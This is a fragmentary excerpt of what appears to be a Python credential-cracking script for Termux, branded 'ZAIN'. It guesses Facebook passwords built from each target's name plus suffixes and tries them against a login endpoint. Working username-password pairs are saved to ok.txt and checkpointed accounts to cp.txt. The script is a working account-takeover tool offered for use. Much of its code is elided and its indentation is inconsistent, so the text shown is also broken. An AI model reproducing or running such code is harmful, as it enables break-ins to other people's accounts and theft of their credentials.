...
"""
try:
    my = requests.get("https://m.facebook.com/Zain.official")
...
if not os.path.isfile("/data/data/com.termux/files/home/sani/...../public/index.js"):
    ...
    print("")
    print("")
    os.system("xdg-open https://m.facebook.com/Zain.official")
    time.sleep(10)
    print("")
    print("")
    print("")
...
def tech_abm():
    ...
    print("")
    print("")
    os.system('echo -e "\t 𝐙𝐀𝐈𝐍 tool has been update      "| lolcat')
    print("")
    print("")
    print("")
    print("")
    ...
    print("")
    print("")
    os.system('echo -e "\t Welcome to new 𝐙𝐀𝐈𝐍-Fast tool       "| lolcat')
    print("")
    print("")
    print("")
    print("")
...
def a_menu_select():
	...
	os.system('echo -e "Dev by : 𝐙𝐀𝐈𝐍 𝐗 𝐊𝐈𝐍𝐙𝐀 "| lolcat')
	os.system('echo -e "-----------------------------------------------"| lolcat')
	...
	def main(arg):
		...
		try:
		    pass1 = name.lower() + p1
                    ...
                    q = json.loads(data)
                    if "access_token" in q:
                        print("\033[1;92m[𝐙𝐀𝐈𝐍-Ok]➤ " + uid + " | " + pass1+" | "+name)
                        ok=open("ok.txt","a")
                        ok.write(uid+" | "+pass1+"\n")
                        ok.close()
                        oks.append(uid + pass1)
                    elif 'www.facebook.com' in q['error']:
                        print("\033[1;93m[𝐙𝐀𝐈𝐍-Cp]➤ " + uid + " | " + pass1+" | "+name)
                        cp=open("cp.txt","a")
                        cp.write(uid+" | "+pass1+"\n")
                        cp.close()
			...
			pass2 = name.lower() + p2
                        ...
                        q = json.loads(data)
                        if "loc" in q:
                            print("\033[1;92m[𝐙𝐀𝐈𝐍-Ok]➤ " + uid + " | " + pass2+" | "+name)
                            ok=open("ok.txt","a")
                            ok.write(uid+" | "+pass2+"\n")
                            ok.close()
                            oks.append(uid + pass2)
                        elif 'www.facebook.com' in q['error']:
                            print("\033[1;93m[𝐙𝐀𝐈𝐍-Cp]➤ " + uid + " | " + pass2+" | "+name)
                            cp=open("cp.txt","a")
                            cp.write(uid+" | "+pass2+"\n")
                            cp.close()
